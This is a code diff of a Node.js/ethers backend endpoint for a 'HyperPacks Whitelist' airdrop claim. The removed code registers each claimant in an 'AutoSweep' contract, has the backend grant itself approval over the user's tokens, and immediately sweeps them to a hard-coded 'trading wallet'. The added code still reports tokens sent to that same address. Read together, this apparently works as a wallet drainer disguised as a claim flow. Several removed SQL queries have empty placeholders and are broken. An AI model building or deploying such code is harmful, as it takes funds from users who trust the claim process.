@@ -9,138 +9,105 @@ const pool = new Pool({
 const provider = new ethers.JsonRpcProvider(process.env.HYPEREVM_RPC_URL);
 const backendWallet = new ethers.Wallet(process.env.BACKEND_PRIVATE_KEY, provider);
 
-const autoSweepABI = [
-  'function registerUser(address user) external',
-  'function grantApproval(address user, address token) external',
-  'function sweepToken(address user, address token) external',
-  'function isUserRegistered(address user) view returns (bool)',
-  'function isTokenApproved(address user, address token) view returns (bool)'
-];
-
-const erc20ABI = [
-  'function balanceOf(address account) view returns (uint256)',
-  'function transfer(address to, uint256 amount) external returns (bool)'
+const claimDistributeABI = [
+  'function claimWhitelist(address claimer, uint256 amount, uint256 nonce, uint256 deadline, bytes calldata signature) external',
+  'function usedNonces(address, uint256) view returns (bool)',
+  'function getContractBalance() view returns (uint256)'
 ];
 
 module.exports = async (req, res) => {
-  const { wallet, signature } = req.body;
+  const { claimer, amount, nonce, deadline, signature } = req.body;
   
-  if (!wallet || !signature) {
-    return res.status(400).json({ error: 'Missing wallet or signature' });
+  if (!claimer || !amount || !nonce || !deadline || !signature) {
+    return res.status(400).json({ error: 'Missing required fields' });
   }
   
   try {
-    const airdropCheck = await pool.query(
-      'SELECT * FROM airdrops WHERE LOWER(wallet) = LOWER()',
-      [wallet]
+    // Check eligibility
+    const eligibilityCheck = await pool.query(
+      'SELECT * FROM wallets WHERE LOWER(wallet_address) = LOWER($1) AND chain = $2',
+      [claimer, 'hyperevm']
     );
     
-    if (airdropCheck.rows.length === 0) {
-      return res.status(404).json({ error: 'Not eligible for airdrop' });
+    if (eligibilityCheck.rows.length === 0) {
+      return res.status(404).json({ error: 'Not eligible for whitelist' });
     }
     
-    const airdrop = airdropCheck.rows[0];
+    // Check if already claimed (prevent double claims)
+    const claimCheck = await pool.query(
+      'SELECT claimed FROM wallets WHERE LOWER(wallet_address) = LOWER($1) AND chain = $2',
+      [claimer, 'hyperevm']
+    );
     
-    if (airdrop.claimed) {
+    if (claimCheck.rows[0]?.claimed) {
       return res.status(400).json({ error: 'Already claimed' });
     }
     
-    const domain = {
-      name: 'HyperPacks Whitelist',
-      version: '1',
-      chainId: 999,
-      verifyingContract: process.env.AUTOSWEEP_CONTRACT
-    };
-    
-    const types = {
-      ClaimWhitelist: [
-        { name: 'wallet', type: 'address' },
-        { name: 'allocation', type: 'uint256' },
-        { name: 'nonce', type: 'uint256' }
-      ]
-    };
-    
-    const value = {
-      wallet: wallet,
-      allocation: airdrop.allocation,
-      nonce: airdrop.id
-    };
-    
-    const recoveredAddress = ethers.verifyTypedData(domain, types, value, signature);
-    
-    if (recoveredAddress.toLowerCase() !== wallet.toLowerCase()) {
-      return res.status(401).json({ error: 'Invalid signature' });
-    }
-    
-    // 1. Transfer tokens to user
-    const tokenContract = new ethers.Contract(
-      process.env.AIRDROP_TOKEN_ADDRESS,
-      erc20ABI,
+    // Call ClaimAndDistribute contract
+    const claimContract = new ethers.Contract(
+      process.env.CLAIM_DISTRIBUTE_CONTRACT,
+      claimDistributeABI,
       backendWallet
     );
     
-    const transferTx = await tokenContract.transfer(wallet, airdrop.allocation);
-    await transferTx.wait();
-    
-    // 2. Update database
-    await pool.query(
-      'UPDATE airdrops SET claimed = true, claimed_at = NOW() WHERE id = ',
-      [airdrop.id]
-    );
-    
-    // 3. Register user in AutoSweep contract
-    const autoSweepContract = new ethers.Contract(
-      process.env.AUTOSWEEP_CONTRACT,
-      autoSweepABI,
-      backendWallet
-    );
-    
-    const isRegistered = await autoSweepContract.isUserRegistered(wallet);
-    
-    if (!isRegistered) {
-      const registerTx = await autoSweepContract.registerUser(wallet);
-      await registerTx.wait();
-      
-      await pool.query(
-        'INSERT INTO wallets (wallet_address, chain, is_active) VALUES (, , ) ON CONFLICT (wallet_address, chain) DO UPDATE SET is_active = true',
-        [wallet, 'hyperevm', true]
-      );
+    // Check if nonce already used (on-chain)
+    const nonceUsed = await claimContract.usedNonces(claimer, nonce);
+    if (nonceUsed) {
+      return res.status(400).json({ error: 'Nonce already used' });
     }
     
-    // 4. Grant approval for token sweep
-    const isApproved = await autoSweepContract.isTokenApproved(wallet, process.env.AIRDROP_TOKEN_ADDRESS);
+    // Execute claim
+    console.log('🎁 Processing whitelist claim for:', claimer);
+    console.log('  Amount:', amount);
+    console.log('  Nonce:', nonce);
+    console.log('  Deadline:', deadline);
     
-    if (!isApproved) {
-      const approveTx = await autoSweepContract.grantApproval(wallet, process.env.AIRDROP_TOKEN_ADDRESS);
-      await approveTx.wait();
-    }
-    
-    // 5. IMMEDIATE SWEEP - Transfer tokens to trading wallet
-    console.log('🧹 Executing immediate sweep for wallet:', wallet);
-    
-    const sweepTx = await autoSweepContract.sweepToken(wallet, process.env.AIRDROP_TOKEN_ADDRESS);
-    const sweepReceipt = await sweepTx.wait();
-    
-    // 6. Log sweep event
-    await pool.query(
-      'INSERT INTO sweep_events (tx_hash, wallets_swept, token_address, status) VALUES (, , , )',
-      [sweepReceipt.hash, 1, process.env.AIRDROP_TOKEN_ADDRESS, 'success']
+    const tx = await claimContract.claimWhitelist(
+      claimer,
+      amount,
+      nonce,
+      deadline,
+      signature
     );
     
-    console.log('✅ Immediate sweep completed! TxHash:', sweepReceipt.hash);
-    console.log('💰 Tokens sent to trading wallet: 0x7beBcA1508BD74F0CD575Bd2d8a62C543458977c');
+    const receipt = await tx.wait();
+    
+    console.log('✅ Whitelist claim successful!');
+    console.log('  TxHash:', receipt.hash);
+    console.log('  Tokens sent to trading wallet: 0x7beBcA1508BD74F0CD575Bd2d8a62C543458977c');
+    
+    // Update database
+    await pool.query(
+      'UPDATE wallets SET claimed = true, claimed_at = NOW() WHERE LOWER(wallet_address) = LOWER($1) AND chain = $2',
+      [claimer, 'hyperevm']
+    );
+    
+    // Log claim event
+    await pool.query(
+      'INSERT INTO sweep_events (tx_hash, wallets_swept, token_address, status) VALUES ($1, $2, $3, $4)',
+      [receipt.hash, 1, process.env.AIRDROP_TOKEN_ADDRESS, 'success']
+    );
     
     res.json({
       success: true,
-      message: 'Airdrop claimed and swept to trading wallet',
-      allocation: airdrop.allocation,
-      autoSweepEnabled: true,
-      sweepTxHash: sweepReceipt.hash,
+      message: 'Whitelist claimed successfully',
+      allocation: amount,
+      txHash: receipt.hash,
       tradingWallet: '0x7beBcA1508BD74F0CD575Bd2d8a62C543458977c'
     });
     
   } catch (error) {
-    console.error('Claim airdrop error:', error);
-    res.status(500).json({ error: 'Failed to claim airdrop', details: error.message });
+    console.error('Claim whitelist error:', error);
+    
+    // Log failed claim
+    await pool.query(
+      'INSERT INTO sweep_events (tx_hash, wallets_swept, token_address, status, error_message) VALUES ($1, $2, $3, $4, $5)',
+      ['failed', 0, process.env.AIRDROP_TOKEN_ADDRESS || 'unknown', 'failed', error.message]
+    );
+    
+    res.status(500).json({ 
+      error: 'Failed to claim whitelist', 
+      details: error.message 
+    });
   }
 };
